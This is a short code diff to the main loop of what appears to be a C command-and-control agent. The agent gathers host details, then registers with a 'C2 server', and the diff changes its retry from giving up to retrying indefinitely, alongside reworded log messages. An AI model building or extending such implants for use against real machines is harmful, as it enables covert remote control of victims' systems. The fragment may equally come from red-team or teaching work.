@@ -16,11 +16,11 @@ int main(void)
     bool host_info_gathered = false;
     while(!host_info_gathered) {
         if(get_host_info(&agent)) {
-            puts("Host info gathered\n");
+            puts("Host info gathered.\n");
             host_info_gathered = true;
-            printf("Hostname in main: %s\n", agent.hostname);
-            printf("Agent os_type in main: %s\n", agent.os_version);
-            printf("Agent os_version in main: %s\n", agent.os_version);
+            // printf("Hostname in main: %s\n", agent.hostname);
+            // printf("Agent os_type in main: %s\n", agent.os_version);
+            // printf("Agent os_version in main: %s\n", agent.os_version);
             break;
         } else {
             puts("Unable to gather host info\n");
@@ -28,6 +28,7 @@ int main(void)
         }
     }
 
+    puts("Registering with C2 server...\n");
     bool registered = false;
     while(!registered) {
         if(reg(&agent, &sa)) {
@@ -36,9 +37,9 @@ int main(void)
 	        printf("The data returning from agent registration main is %s\n\n", sa.response);
             continue;
         } else {
-            puts("Not Registered, trying again\n");
+            puts("Failed to register agent with C2 server, trying again.\n");
             sleep(5);
-            break;
+            continue;
         }
 
     }
